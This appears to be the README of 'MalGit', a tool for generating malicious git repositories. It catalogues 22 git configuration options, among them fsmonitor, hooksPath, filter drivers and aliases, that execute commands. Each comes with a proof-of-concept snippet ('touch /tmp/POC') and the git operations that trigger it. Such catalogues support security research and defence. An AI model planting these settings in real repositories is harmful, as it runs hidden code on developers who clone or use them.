![alt-text](Captures/logo.png)

# MalGit

To generate a malicious repository, run the following command:

```bash
./malgit.sh
```

## Vectors

1. [Vector 1: core.fsmonitor](#vector-1-corefsmonitor)
2. [Vector 2: pager.<cmd>](#vector-2-pagercmd)
3. [Vector 3: credential.helper](#vector-3-credentialhelper)
4. [Vector 4: core.hooksPath](#vector-4-corehookspath)
5. [Vector 5: core.sshCommand](#vector-5-coresshcommand)
6. [Vector 6: core.editor](#vector-6-coreeditor)
7. [Vector 7: filter.<driver>.clean](#vector-7-filterdriverclean)
8. [Vector 8: filter.<driver>.smudge](#vector-8-filterdriversmudge)
9. [Vector 9: filter.<driver>.process](#vector-9-filterdriverprocess)
10. [Vector 10: merge.<driver>.driver](#vector-10-mergedriverdriver)
11. [Vector 11: diff.<driver>.textconv](#vector-11-diffdrivertextconv)
12. [Vector 12: diff.external](#vector-12-diffexternal)
13. [Vector 13: hook.<friendly-name>.command](#vector-13-hookfriendly-namecommand)
14. [Vector 14: uploadpack.packObjectsHook](#vector-14-uploadpackpackobjectshook)
15. [Vector 15: gc.recentObjectsHook](#vector-15-gcrecentobjectshook)
16. [Vector 16: imap.tunnel](#vector-16-imaptunnel)
17. [Vector 17: tar.<format>.command](#vector-17-tarformatcommand)
18. [Vector 18: core.alternateRefsCommand](#vector-18-corealternaterefscommand)
19. [Vector 19: trailer.<key-alias>.cmd/command](#vector-19-trailerkey-aliascmdcommand)
20. [Vector 20: gpg.program](#vector-20-gpgprogram)
21. [Vector 21: gpg.ssh.defaultKeyCommand](#vector-21-gpgsshdefaultkeycommand)
22. [Vector 22: alias.<name>](#vector-22-aliasname)

## Vector 1: core.fsmonitor

### Overview

The `core.fsmonitor` configuration option specifies a program to monitor the
working tree for changes. This program is executed by `git` when `git` reads
and refreshes the index for worktree state.

### Configuration Syntax

File: `.git/config`
```ini
[core]
    fsmonitor = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[core]
    fsmonitor = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git status`
- `git add`
- `git commit`
- Any operations that read and refresh the index.

## Vector 2: pager.<cmd>

### Overview

The `pager.<cmd>` configuration specifies which pager program to use for
displaying output of specific `git` commands. When output goes to a terminal
(TTY), `git` can invoke the configured pager program.

### Configuration Syntax

File: `.git/config`
```ini
[pager]
    log = "sh -c 'touch /tmp/POC'" # Execute a shell command.
    status = "sh -c 'touch /tmp/POC'" # Execute a shell command.
    show = "sh -c 'touch /tmp/POC'" # Execute a shell command.
    diff = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[pager]
    log = "/path/to/script" # Execute a script.
    status = "/path/to/script" # Execute a script.
    show = "/path/to/script" # Execute a script.
    diff = "/path/to/script" # Execute a script.
```

Replace `log` with another command name, such as `status`, `show`, or `diff`,
to configure that command's pager.

### Trigger Conditions

- `git log` (with TTY output).
- `git status` (with TTY output).
- `git show` (with TTY output).
- `git diff` (with TTY output).

## Vector 3: credential.helper

### Overview

The `credential.helper` configuration specifies a program to use for retrieving
or storing credentials for authentication operations. This can be invoked when
`git` requests credentials for a remote server (HTTP/HTTPS).

### Configuration Syntax

File: `.git/config`
```ini
[credential]
    helper = "!sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[credential]
    helper = /path/to/script # Execute a script.
```

### Trigger Conditions

- `git fetch` (from HTTP/HTTPS remote with auth).
- `git push` (to HTTP/HTTPS remote with auth).
- `git pull` (from HTTP/HTTPS remote with auth).
- `git clone` (HTTP/HTTPS with authentication).

## Vector 4: core.hooksPath

### Overview

The `core.hookspath` configuration specifies a directory containing `git` hooks
to execute instead of the default `.git/hooks/` directory. `git` hooks are
scripts that execute at various points in the `git` workflow. Hook files must
be executable.

### Configuration Syntax

File: `.git/config`
```ini
[core]
    hookspath = "/path/to/hooks" # Absolute path to hooks folder.
```

or

File: `.git/config`
```ini
[core]
    hookspath = ".custom-hooks" # Relative path to hooks folder.
```

Pre-commit Hook Hijacking:

File: `.git/config`
```ini
[core]
    hookspath = ".custom-hooks"
```

File: `.custom-hooks/pre-commit`
```bash
#!/bin/bash
touch /tmp/POC
exit 0  # Pretend hook succeeded
```

Post-commit Hook Hijacking:

File: `.custom-hooks/post-commit`
```bash
#!/bin/bash
touch /tmp/POC
exit 0  # Pretend hook succeeded
```

Prepare-commit-msg Injection:

File: `.custom-hooks/prepare-commit-msg`
```bash
#!/bin/bash
touch /tmp/POC
exit 0  # Pretend hook succeeded
```

### Trigger Conditions

- `git commit` (pre-commit, prepare-commit-msg, commit-msg, post-commit hooks).
- `git rebase` (various rebase hooks).
- `git merge` (pre-merge-commit hook).
- `git push` can invoke the local repository's `pre-push` hook.
- On the receiving repository, `git receive-pack` can invoke the
  `push-to-checkout` hook when the push updates the currently checked-out
  branch and `receive.denyCurrentBranch=updateInstead` is configured there.

## Vector 5: core.sshCommand

### Overview

The `core.sshCommand` configuration specifies the SSH command to use for `git`
operations over SSH. This allows custom SSH invocation, which can include
arbitrary shell commands.

### Configuration Syntax

File: `.git/config`
```ini
[core]
    sshCommand = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[core]
    sshCommand = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git clone` (over SSH).
- `git fetch` (from SSH remote).
- `git push` (to SSH remote).
- `git pull` (from SSH remote).

## Vector 6: core.editor

### Overview

The `core.editor` configuration specifies the text editor to use for commit
messages, rebase editing, and tag creation. This editor program is executed
whenever `git` needs user input for editing and no higher-priority editor
setting overrides it.

### Configuration Syntax

File: `.git/config`
```ini
[core]
    editor = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[core]
    editor = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git commit` when `git` needs to edit a commit message. Options and modes
  that supply or reuse a message without editing, such as `-m`, `-F`, `-C`,
  `--no-edit`, and ordinary `--fixup=<commit>`, suppress the editor unless
  editing is explicitly requested where supported.
- `git rebase -i` (unless a sequence editor overrides `core.editor`).
- `git tag -a` (without `-m` or `-F`).
- `git tag -s` (without `-m` or `-F`).

## Vector 7: filter.<driver>.clean

### Overview

The `filter.<driver>.clean` configuration specifies a command that converts
worktree content before `git` stores it in the index. The filter runs only for
paths whose attributes select the configured driver.

### Configuration Syntax

File: `.git/config`
```ini
[filter "custom"]
    clean = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[filter "custom"]
    clean = "/path/to/script" # Execute a script.
```

File: `.gitattributes`
```gitattributes
* filter=custom
```

### Trigger Conditions

- `git add` for a path with `filter=custom`.
- `git commit -a` when `git` cleans a matching modified path.
- Other operations that convert matching worktree content for storage in `git`.

## Vector 8: filter.<driver>.smudge

### Overview

The `filter.<driver>.smudge` configuration specifies a command that converts
blob content before `git` writes it into the worktree. The filter runs only for
paths whose attributes select the configured driver.

### Configuration Syntax

File: `.git/config`
```ini
[filter "custom"]
    smudge = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[filter "custom"]
    smudge = "/path/to/script" # Execute a script.
```

File: `.gitattributes`
```gitattributes
* filter=custom
```

### Trigger Conditions

- `git checkout` or `git switch` when writing a matching path.
- `git restore` when writing a matching path.
- `git reset --hard` when writing a matching path.
- `git clone` when an available configuration scope already defines the
  selected filter.

## Vector 9: filter.<driver>.process

### Overview

The `filter.<driver>.process` configuration specifies a long-running filter
process that can perform both clean and smudge conversions. It takes precedence
over separate `clean` and `smudge` commands for capabilities it advertises and
must implement `git`'s packet-based long-running filter protocol.

### Configuration Syntax

File: `.git/config`
```ini
[filter "custom"]
    process = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[filter "custom"]
    process = "/path/to/script" # Execute a script.
```

File: `.gitattributes`
```gitattributes
* filter=custom
```

### Trigger Conditions

- Clean operations such as `git add` for a matching path.
- Smudge operations such as checkout, switch, restore, or reset for a matching
  path.

## Vector 10: merge.<driver>.driver

### Overview

The `merge.<driver>.driver` configuration specifies a custom low-level merge
driver. `git` invokes it only for paths whose attributes select the driver and
that require a content merge.

### Configuration Syntax

File: `.git/config`
```ini
[merge "custom"]
    driver = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[merge "custom"]
    driver = "/path/to/script" # Execute a script.
```

File: `.gitattributes`
```gitattributes
* merge=custom
```

### Trigger Conditions

- `git merge` when a matching path requires a content merge.
- `git rebase` when replaying a commit requires such a merge.
- `git cherry-pick` when applying a commit requires such a merge.

## Vector 11: diff.<driver>.textconv

### Overview

The `diff.<driver>.textconv` configuration specifies a command that converts a
file into text for human-readable diff output. `git` appends the temporary
input file path to the configured command. The command applies only to paths
whose attributes select the diff driver.

### Configuration Syntax

File: `.git/config`
```ini
[diff "custom"]
    textconv = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[diff "custom"]
    textconv = "/path/to/script" # Execute a script.
```

File: `.gitattributes`
```gitattributes
* diff=custom
```

### Trigger Conditions

- `git diff` when text conversion is enabled for a matching path.
- `git show` or `git log -p` when displaying a matching path.
- `git grep --textconv` for a matching path.
- `git cat-file --textconv` for a matching path.

## Vector 12: diff.external

### Overview

The `diff.external` configuration specifies an external program that replaces
`git`'s internal diff generation. `git` passes path, object, mode, and
temporary file arguments to the configured program.

### Configuration Syntax

File: `.git/config`
```ini
[diff]
    external = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[diff]
    external = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git diff` when an external diff is allowed and a changed path is processed.
- `git show --ext-diff` when displaying a changed path.
- `git log -p --ext-diff` when displaying a changed path.

`--no-ext-diff` suppresses the external diff program.

## Vector 13: hook.<friendly-name>.command

### Overview

The `hook.<friendly-name>.command` configuration specifies a configured hook
command. At least one corresponding `hook.<friendly-name>.event` value is
required to select the `git` hook event that runs it.

### Configuration Syntax

File: `.git/config`
```ini
[hook "custom"]
    command = "sh -c 'touch /tmp/POC'" # Execute a shell command.
    event = pre-commit
```

or

File: `.git/config`
```ini
[hook "custom"]
    command = "/path/to/script" # Execute a script.
    event = pre-commit
```

### Trigger Conditions

- The `git` operation must reach the configured event, such as `git commit` for
  `pre-commit`.
- The hook must not be disabled through `hook.<friendly-name>.enabled=false`.
- The event must not be disabled through `hook.<event>.enabled=false`, which
  suppresses all configured and traditional hooks for that event.

## Vector 14: uploadpack.packObjectsHook

### Overview

The `uploadpack.packObjectsHook` configuration replaces the `git pack-objects`
process that `git upload-pack` would normally start for a client. `git` appends
the original `git pack-objects` command and its arguments to the configured
command.

This option is honored only when it comes from protected configuration.

### Configuration Syntax

File: `.git/config`
```ini
[uploadpack]
    packObjectsHook = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[uploadpack]
    packObjectsHook = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- A server-side `git upload-pack` process must generate a pack for a fetch or
  clone client.
- The setting must come from protected configuration rather than ordinary
  repository-local configuration.

## Vector 15: gc.recentObjectsHook

### Overview

The `gc.recentObjectsHook` configuration specifies a shell command whose output
lists object IDs that `git` should treat as recent. `git` can execute multiple
configured commands, and each must exit successfully.

### Configuration Syntax

File: `.git/config`
```ini
[gc]
    recentObjectsHook = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[gc]
    recentObjectsHook = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git gc` when it considers otherwise-unreachable objects for removal.
- `git repack --cruft` when it enumerates recent unreachable objects.
- Other pruning operations that load the configured recent-object hooks.

## Vector 16: imap.tunnel

### Overview

The `imap.tunnel` configuration specifies a command that `git imap-send` uses
as a bidirectional tunnel instead of connecting directly to an IMAP host.

### Configuration Syntax

File: `.git/config`
```ini
[imap]
    tunnel = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[imap]
    tunnel = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git imap-send` when `imap.tunnel` is configured and `git` attempts to start
  the IMAP connection.

## Vector 17: tar.<format>.command

### Overview

The `tar.<format>.command` configuration specifies a shell command through
which `git archive` pipes generated tar data for a custom archive format.

### Configuration Syntax

File: `.git/config`
```ini
[tar "custom"]
    command = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[tar "custom"]
    command = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git archive --format=custom <tree-ish>`.
- A remote archive request for that format only when
  `tar.custom.remote=true` is also configured on the server.

## Vector 18: core.alternateRefsCommand

### Overview

The `core.alternateRefsCommand` configuration specifies a command that lists
reference tips from an alternate object database. `git` appends the absolute
path of the alternate repository and expects one object ID per output line.

### Configuration Syntax

File: `.git/config`
```ini
[core]
    alternateRefsCommand = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[core]
    alternateRefsCommand = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- An alternate object database must be configured.
- `git` must enumerate alternate reference tips, for example through
  `git rev-list --alternate-refs`.

## Vector 19: trailer.<key-alias>.cmd/command

### Overview

The `trailer.<key-alias>.cmd` configuration specifies a shell command that
generates or modifies the value of a configured trailer. The older
`trailer.<key-alias>.command` form is deprecated. When both are configured,
`cmd` takes precedence.

### Configuration Syntax

File: `.git/config`
```ini
[trailer "custom"]
    key = Custom
    cmd = "sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[trailer "custom"]
    key = Custom
    cmd = "/path/to/script" # Execute a script.
```

### Trigger Conditions

- `git interpret-trailers` when it processes the configured trailer.
- `git commit --trailer custom` when it processes that trailer alias.

## Vector 20: gpg.program

### Overview

The `gpg.program` configuration specifies the executable used instead of GPG
for OpenPGP signing and verification. `git` executes it directly and appends
the normal GPG command-line arguments, so the value should be a program path
rather than a shell command.

### Configuration Syntax

File: `.git/config`
```ini
[gpg]
    program = "/path/to/script" # Execute script directly.
```

### Trigger Conditions

- `git commit -S` or `git tag -s` using the OpenPGP signing format.
- `git verify-commit` or `git verify-tag` for an OpenPGP signature.
- Commands such as `git log --show-signature` that verify an OpenPGP signature.

## Vector 21: gpg.ssh.defaultKeyCommand

### Overview

The `gpg.ssh.defaultKeyCommand` configuration specifies a command used to find
the default SSH signing key. `git` uses it only when SSH signing is selected
and `user.signingKey` is unset. The command must normally print a valid SSH
public key prefixed with `key::`.

### Configuration Syntax

File: `.git/config`
```ini
[gpg]
    format = ssh
[gpg "ssh"]
    defaultKeyCommand = "touch /tmp/POC" # Run a program with arguments.
```

or

File: `.git/config`
```ini
[gpg]
    format = ssh
[gpg "ssh"]
    defaultKeyCommand = "/path/to/script" # Execute a script directly.
```

### Trigger Conditions

- `git commit -S` with `gpg.format=ssh` and no `user.signingKey`.
- `git tag -s` with `gpg.format=ssh` and no `user.signingKey`.

## Vector 22: alias.<name>

### Overview

An alias value beginning with `!` is executed as a shell command instead of
being expanded as another `git` command. `git` removes the leading `!` and
passes any additional alias arguments to the shell command.

### Configuration Syntax

File: `.git/config`
```ini
[alias]
    custom = "!sh -c 'touch /tmp/POC'" # Execute a shell command.
```

or

File: `.git/config`
```ini
[alias]
    custom = "!/path/to/script" # Execute a script through the shell.
```

### Trigger Conditions

- `git custom`.
- Additional arguments, if supplied, are appended to the shell command.
